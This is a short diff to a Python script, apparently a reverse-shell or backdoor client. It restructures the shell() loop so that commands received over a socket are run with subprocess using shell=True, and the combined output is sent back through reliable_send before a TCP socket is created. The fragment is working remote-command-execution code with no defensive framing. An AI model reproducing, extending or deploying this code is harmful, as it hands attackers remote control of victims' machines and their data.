@@ -25,11 +25,15 @@ def shell():
             break
         elif command == 'help':
             pass
-        execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
-                                   stdin=subprocess.PIPE)
-        result = execute.stdout.read() + execute.stderr.read()
-        result = result.decode()
-        reliable_send(result)
+        elif command == 'clear':
+            pass
+
+        else:
+            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+                                       stdin=subprocess.PIPE)
+            result = execute.stdout.read() + execute.stderr.read()
+            result = result.decode()
+            reliable_send(result)
 
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
